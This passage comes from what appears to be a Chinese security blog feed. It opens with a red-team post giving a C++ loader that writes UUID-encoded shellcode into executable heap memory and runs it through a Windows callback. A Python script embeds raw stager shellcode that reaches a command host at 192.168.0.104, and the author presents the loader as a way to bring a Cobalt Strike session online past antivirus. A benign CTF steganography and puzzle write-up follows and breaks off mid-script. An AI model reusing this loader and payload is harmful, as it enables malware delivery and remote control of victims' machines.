class="string">&quot;cfafb2ac-e2bb-b0af-ca5b-08834c927ab5&quot;</span>,<span class="string">&quot;07d2b997-8fc9-80b7-fc26-3da3d19e2942&quot;</span>,<span class="string">&quot;780bcd05-11c2-4f86-6657-dae24b98cc46&quot;</span>,<span class="string">&quot;febde54d-2cc7-d3c4-e5c0-f943cad41d5a&quot;</span>,<span class="string">&quot;6800da73-b5f0-56a2-ffd5-6a4068001000&quot;</span>,<span class="string">&quot;00006800-0040-6857-58a4-53e5ffd593b9&quot;</span>,<span class="string">&quot;00000000-d901-5351-89e7-576800200000&quot;</span>,<span class="string">&quot;12685653-8996-ffe2-d585-c074c68b0701&quot;</span>,<span class="string">&quot;75c085c3-58e5-e8c3-a9fd-ffff31302e31&quot;</span>,<span class="string">&quot;32342e39-312e-3434-0012-345678000000&quot;</span> &#125;; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//获得可执行的句柄</span></span><br><span class="line">  <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//申请堆空间</span></span><br><span class="line">  <span class="keyword">if</span> (ha == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;内存申请失败！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">  <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);<span class="comment">//获得需要写入uuids数组元素个数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; (RPC_CSTR)uuids[i] &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; (UUID*)hptr &lt;&lt; endl;</span></span><br><span class="line">    RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//写入shellcode</span></span><br><span class="line">      <span class="keyword">if</span> (status != RPC_S_OK)<span class="comment">//判断是否写入正常</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;UuidFromeStringA()!=S_OK&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(ha);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    hptr += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//((void(*)())ha)();</span></span><br><span class="line">  EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//回调函数,运行shellcode</span></span><br><span class="line">  CloseHandle(ha);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cs直接上线，这里我们需要用的一个python转换uuid脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x76\x31\x62\x53\x00\x7f\x91\xe7\xa6\x06\xaf\x0e\x4c\xd7\x9a\xe9\x05\x62\x44\xda\x5c\x48\x62\xfe\x2c\x1a\xb1\x46\xe5\x9e\x3b\x14\x69\x39\x97\x1f\x0b\xfb\x1a\xf6\x8d\x89\x79\x72\x62\x8f\xcc\x16\x3a\xab\x4c\x4b\x8d\x50\xe4\xb5\xa1\x30\x1f\x46\x17\x84\xa1\x17\x69\xec\x2a\x4a\xfe\xe7\xb0\x87\xb9\x7b\x5c\x61\x3a\xfe\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x53\x42\x29\x0d\x0a\x00\x79\x00\x1b\x42\x2e\x57\x64\xda\x01\x3c\x02\xc6\x2a\x4a\xda\xc8\x22\x1e\x92\x76\x61\x47\x80\x02\xb1\x8c\x24\x61\x92\x9f\x53\x58\x73\xde\xae\x52\x30\x67\x82\x47\x32\x4b\x35\x10\x11\xfd\xe2\x1d\x2b\x26\x18\x6b\x9d\x85\x58\x10\x32\xa4\x0a\xcd\x92\xc1\x5a\x10\x50\x6b\xe7\x87\x2a\xd9\xcf\xce\x92\x06\x1c\x39\x6b\x75\x42\xfb\x81\x4b\x60\x0b\x56\xcc\x1b\xa7\xe6\x0b\x0f\x49\xdd\xc5\xcc\x48\x0d\xf4\xdb\x98\xf1\xbf\x0d\xa8\x9b\x45\xcb\x4f\x41\x26\x96\xf5\x0d\x4d\xe4\x58\x83\x1f\x81\x6e\x67\xea\x94\xab\x49\x5c\xc0\x6f\x1d\x8c\x78\x8c\xc5\xd7\x01\x4d\xc7\x89\xc1\x8e\xe5\x46\x6d\xab\x99\x5f\xa2\x26\xe1\xcc\x58\x8c\xef\x16\xcd\xe5\x02\x4a\xf9\xe5\x42\x1c\xb8\x4a\x96\x7e\x69\x9a\x30\x37\x97\x0d\x4e\x7e\x4c\xaf\x69\xcc\x9a\x36\xb3\xe5\x2a\x7b\x77\x64\x48\x30\xa3\x44\x27\x76\xd8\xe6\x03\x2a\x56\xeb\xe7\x21\xb1\xf6\x78\x2e\xf0\xaa\x43\xdf\x46\xa3\x95\x14\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x30\x2e\x31\x30\x34\x00\x12\x34\x56\x78\x90\x90&quot;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    bytes_a = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shellcode.c&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;const char* uuids[] =&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> UUID <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        f.write(<span class="string">&quot;\&quot;&quot;</span>+UUID+<span class="string">&quot;\&quot;&quot;</span>+<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;&#125;;&quot;</span>)</span><br><span class="line">print(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure><p>替换shellcode，你懂我的意思吧！<br>在实验的时候我忘了关卡巴，然后你懂得！哈哈哈哈哈哈哈哈哈</p><h1 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h1><p>这里虽然还是给杀了，那是因为这种uuid还是存在一定的特征，还是会被杀，但是这里讲究的是一个思路，可以用其他windows api 来向内存中写入shellcode，加载shellcode，而且在国外大佬blog提到了很多windows api都可以实现这样的功能。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-大吉大利杯&amp;&amp;“春秋杯”新年欢乐赛 2021</title>
      <link href="2021/01/30/2020ctfshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF&amp;&amp;%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
      <url>2021/01/30/2020ctfshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF&amp;&amp;%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：比赛当天没空，不过事后听Lumos师傅说里面题目挺有意思的，于是就决定今天复现一波（后附2021“春秋杯”新年欢乐赛的解题思路）</p></blockquote><hr><h1 id="大吉大利杯"><a href="#大吉大利杯" class="headerlink" title="大吉大利杯"></a>大吉大利杯</h1><h2 id="1-十八般兵器"><a href="#1-十八般兵器" class="headerlink" title="1.十八般兵器"></a>1.十八般兵器</h2><blockquote><p>感谢@i_kei师傅供题<br>刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</p><p>Hint1：JPHS<br>Hint2：用Notepad++打开试试？<br>Hint3：前十种兵器对应10进制，后八种对应8进制</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/1/rar"><strong>附件</strong></a></p></blockquote><p>根据名字加个后缀.rar，再根据压缩包提示2021牛年大吉解压得到十八般兵器的图片</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4250737814.png"></p><p>接着JPHS隐写并根据题目依次排序得到一串数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">136143999223163525817639797858700963935</span><br><span class="line">3044053720460556276610613346353724230575</span><br></pre></td></tr></table></figure><p>然后前十个十进制转十六进制，后八个八进制转十六进制得到字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</span><br></pre></td></tr></table></figure><p>最后hex解码得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_10_bA_Ban_b1ng_Q1&#125;</span><br></pre></td></tr></table></figure><h2 id="2-请问大吉杯的签到是在这里签吗"><a href="#2-请问大吉杯的签到是在这里签吗" class="headerlink" title="2.请问大吉杯的签到是在这里签吗"></a>2.请问大吉杯的签到是在这里签吗</h2><blockquote><p>flag为全部小写字母，没有空格<br>@感谢cheyenne师傅供题</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/01/29448119.png"><strong>附件</strong></a></p></blockquote><p>经典老套娃了，分离出四张图片<br>根据扫码得到的信息可知关键在第二张图片，将其放入steg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/861280115.png"></p><p>很明显比对猪圈密码表得到flag：flag{dajiadoaidjb}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2577881711.png"></p><h2 id="3-牛年大吉"><a href="#3-牛年大吉" class="headerlink" title="3.牛年大吉"></a>3.牛年大吉</h2><blockquote><p>题目下载 蓝奏云下载地址：<a href="https://wws.lanzous.com/i1Ac0jybrvc">https://wws.lanzous.com/i1Ac0jybrvc</a> 百度云下载地址： <a href="https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ">https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ</a> 提取码：ns2k<br>感谢i_kei师傅供题</p><p>Hint1：不要格式化哟，看看引导扇区是不是丢东西了<br>Hint2：压缩包密码在图片文件头里</p></blockquote><p>vhd直接打开发现不能装载（引导扇区全部被抹除），于是用winhex打开读取发现有张图片和压缩包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/418812427.png"></p><p>压缩包密码就是图片的文件头89504E47，最终得到flag：flag{CTFshow_The_Year_of_the_Ox}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1245253420.png"></p><h2 id="4-简单的FM"><a href="#4-简单的FM" class="headerlink" title="4.简单的FM"></a>4.简单的FM</h2><blockquote><p>简单的FM<br>感谢@阿狸师傅供题</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/1/misc1.wav"><strong>附件</strong></a></p></blockquote><p>在复现了ing…（0%</p><h2 id="5-童话镇"><a href="#5-童话镇" class="headerlink" title="5.童话镇"></a>5.童话镇</h2><blockquote><p>一曲童话镇，多少断肠人？ <a href="https://ctfshow.lanzous.com/iA8HFkn4q9c">https://ctfshow.lanzous.com/iA8HFkn4q9c</a><br>感谢@阿狸师傅供题</p><p>hint1：离别<br>hint2：思念<br>hint3：爱<br>hint4：印象</p></blockquote><p>binwalk分离出一个加密的压缩包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3789173368.png"></p><p>爆破得到密码：67373</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1461826828.png"></p><p>接着就是算法这块了2333~（KNN）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x_train = []</span><br><span class="line">y_train = []</span><br><span class="line">x_test = []</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;t.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = f1.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s = s.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    p1 = literal_eval(s.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    p2 = literal_eval(s.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    x_train.append(p1)</span><br><span class="line">    x_test.append(p2)</span><br><span class="line">    <span class="comment">#print(x_train)</span></span><br><span class="line">    <span class="comment">#print(x_test)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = f2.readline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    s = s.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s = literal_eval(s)</span><br><span class="line">    y_train.append(s)</span><br><span class="line">    <span class="comment">#print(y_train)</span></span><br><span class="line">x_train = np.array(x_train)</span><br><span class="line">y_train = np.array(y_train)</span><br><span class="line">x_test = np.array(x_test)</span><br><span class="line"></span><br><span class="line">clf = KNeighborsClassifier(n_neighbors = <span class="number">1</span>)</span><br><span class="line">clf.fit(x_train, x_test)</span><br><span class="line">y_test = clf.predict(y_train)</span><br><span class="line"></span><br><span class="line">f3 = <span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> y_test:</span><br><span class="line">    f3.write(<span class="built_in">str</span>(y_test[i]))</span><br><span class="line">f3.close()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1851802218.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">pic = Image.new(<span class="string">&quot;L&quot;</span>, (<span class="number">991</span>, <span class="number">79</span>))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">991</span>):</span><br><span class="line">        <span class="keyword">if</span> fp[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pic.putpixel([x,y], <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y], <span class="number">0</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">pic.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3608572468.png"></p><h2 id="6-色图生成器"><a href="#6-色图生成器" class="headerlink" title="6.色图生成器"></a>6.色图生成器</h2><blockquote><p>欢迎使用色图生成器<br>已获取flag，正在为您生成色图……<br>色图生成完毕，准备传输<br>正在传输色图……<br>ERROR! 检测到屏蔽系统，传输被中断<br>准备为色图打码<br>正在生成马赛克……<br>打码完成，准备添加冗余数据……<br>添加完成，正在打包……<br>打包完成，准备传输……<br>传输完成，请点击下方链接下载您的色图<br>感谢@cheyenne师傅供题</p><p>Hint1：颜色很重要，但github更重要<br>Hint2：第一步图片很重要，txt不重要<br>Hint3：看一看马赛克部分的RGB值，有没有想到什么呢</p><p><a href="https://blog.harvey.plus/usr/uploads/2021/1/setu.zip"><strong>附件</strong></a></p></blockquote><p>在复现了ing…（0%</p><h2 id="7-拼图v2-0"><a href="#7-拼图v2-0" class="headerlink" title="7.拼图v2.0"></a>7.拼图v2.0</h2><blockquote><p>有手就行，没手的可以拿眼睛去瞪<br>感谢@nimda师傅供题</p><p><a href="https://ctf.show/challenges#%E6%8B%BC%E5%9B%BEv2.0-912"><strong>题目地址</strong></a></p></blockquote><p>chrome插件Save All Resources将其下载进行拼图</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2761437209.png"></p><p>跑下脚本得到flag：flag{f4864ce0-18d6-4e45-bb51-08a9d47de97f}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1976149264.png"></p><p>脚本附上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模板图：运行目录下的 model.png</span></span><br><span class="line"><span class="comment"># 新建 output 和 blocks 文件夹</span></span><br><span class="line"><span class="comment"># 拼图切片放在 blocks 文件夹中</span></span><br><span class="line"><span class="comment"># 常量设置在 79 行</span></span><br><span class="line"><span class="comment"># PIECES = 225 切片总数</span></span><br><span class="line"><span class="comment"># SQURE_LENGTH = 42 切片边长</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Squeeze Model Picture into pieces</span></span><br><span class="line"><span class="comment"># Returns the path to the folder which contains pictures taged as 1.png, 2.png</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ModelPictureSqueeze</span>(<span class="params">filePath, population, lengthSqueezeSquare</span>):</span></span><br><span class="line">    modelImg = Image.<span class="built_in">open</span>(filePath)</span><br><span class="line">    width, height = modelImg.size</span><br><span class="line">    widthSqueezeCount = width // lengthSqueezeSquare <span class="comment"># squeeze count from long side</span></span><br><span class="line">    heightSqueezeCount = height // lengthSqueezeSquare</span><br><span class="line"></span><br><span class="line">    storageDir = os.path.dirname(os.path.realpath(filePath))</span><br><span class="line">    os.mkdir(storageDir + <span class="string">&quot;\\model&quot;</span>)</span><br><span class="line">    regions = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(heightSqueezeCount):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(widthSqueezeCount):</span><br><span class="line">            box = (lengthSqueezeSquare * j, lengthSqueezeSquare * i, lengthSqueezeSquare * (j + <span class="number">1</span>), lengthSqueezeSquare * (i + <span class="number">1</span>))</span><br><span class="line">            region = modelImg.crop(box)</span><br><span class="line">            regions.append(region)</span><br><span class="line">            region.save(storageDir + <span class="string">&#x27;\\model\\&#123;&#125;.&#123;&#125;&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i, j, <span class="string">&quot;.L&quot;</span> <span class="keyword">if</span> j == (widthSqueezeCount - <span class="number">1</span>) <span class="keyword">and</span> (i + <span class="number">1</span>) * (j + <span class="number">1</span>) != population <span class="keyword">else</span> <span class="string">&quot;.E&quot;</span> <span class="keyword">if</span> (i + <span class="number">1</span>) * (j + <span class="number">1</span>) == population <span class="keyword">else</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> regions, widthSqueezeCount</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fetch nine points as a sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NinePointSamplingAnalyze</span>(<span class="params">image</span>):</span></span><br><span class="line">    width, height = image.size</span><br><span class="line">    imgObject = image.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    pixels = imgObject.load()</span><br><span class="line">    samplings = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            samplePixel = pixels[(width - <span class="number">1</span>) <span class="keyword">if</span> j == <span class="number">2</span> <span class="keyword">else</span> (width // <span class="number">2</span>) * j, (height - <span class="number">1</span>) <span class="keyword">if</span> i == <span class="number">2</span> <span class="keyword">else</span> (height // <span class="number">2</span>) * i]</span><br><span class="line">            samplings.append(samplePixel)</span><br><span class="line">    image.close()</span><br><span class="line">    <span class="keyword">return</span> samplings</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match one model sample with one puzzle sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingMatch</span>(<span class="params">modelSample, 